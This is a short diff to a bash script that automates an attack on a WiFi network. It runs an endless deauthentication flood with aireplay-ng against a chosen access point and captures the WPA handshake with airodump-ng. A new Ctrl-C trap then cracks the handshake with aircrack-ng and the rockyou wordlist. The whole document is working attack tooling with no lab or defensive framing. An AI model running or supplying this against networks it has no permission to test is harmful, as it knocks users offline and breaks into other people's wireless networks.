@@ -56,16 +56,20 @@ output_dir="pcap_files"
 mkdir -p "$output_dir"
 output_file="${output_dir}/${bssid}_${timestamp}"
 
+crack_handshake() {
+    pkill -TERM -P $$
+
+    # Wait for capture file to be generated
+    pcap_file="${output_file}-01.cap"
+    wait
+
+    # Run aircrack-ng on the captured file using rockyou wordlist
+    aircrack-ng -w "wordlists/rockyou.txt" "$pcap_file"
+
+    exit 0
+}
+
+trap crack_handshake SIGINT
+
 # Launch attacks in separate xterm windows
-xterm -e "aireplay-ng -0 0 -a $bssid $interface" &
-sleep 1
-xterm -e "airodump-ng --bssid $bssid -c $channel -w $output_file $interface"
-
-# Wait for capture file to be generated
-pcap_file="${output_file}-01.cap"
-wait
-
-# Run aircrack-ng on the captured file using rockyou wordlist
-aircrack-ng -w "wordlists/rockyou.txt" "$pcap_file"
-
-exit 0
+xterm -e "aireplay-ng -0 0 -a $bssid $interface" & sleep 1 && xterm -e "airodump-ng --bssid $bssid -c $channel -w $output_file $interface"
